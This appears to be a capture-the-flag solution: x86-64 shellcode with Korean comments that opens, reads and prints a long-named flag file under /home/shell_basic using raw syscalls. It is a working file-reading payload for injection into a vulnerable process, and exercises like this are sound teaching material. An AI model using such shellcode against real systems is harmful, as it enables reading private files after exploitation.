; 주어진 directory에서 flag를 읽어온다.

; open()
push 0x00
mov rax, 0x676e6f6f6f6f6f6f
push rax
mov rax, 0x6c5f73695f656d61
push rax
mov rax, 0x6e5f67616c662f63
push rax
mov rax, 0x697361625f6c6c65
push rax
mov rax, 0x68732f656d6f682f
push rax
mov rdi, rsp                    ; rdi = "/home/shell_basic/flag_name_is_loooooong"
xor rsi, rsi                    ; rsi = 0 -> RD_ONLY
xor rdx, rdx                    ; rdx = 0 -> NULL
mov rax, 2                      ; rax = 2 -> open() syscall
syscall                         ; syscall

; read()
; 위의 open의 return 값은 rax에 저장되므로 가져와야함.
mov rdi, rax                    ; 결과값 가져옴 즉, rdi = fd
mov rsi, rsp
sub rsi, 0x30                   ; rsi = rsp - 0x30 ( buf )
mov rdx, 0x30                   ; ( len )
mov rax, 0x00                   ; rax = 0 -> read() syscall
syscall                         ; syscall

; write()
; rsi와 rdi는 이전 read 값을 그대로 사용하므로 변경할 필요 없음.
mov rdi, 1                      ; rdi = fd = 1 -> stdout
mov rax, 0x1                    ; rax = 1 -> write() syscall
syscall                         ; syscall
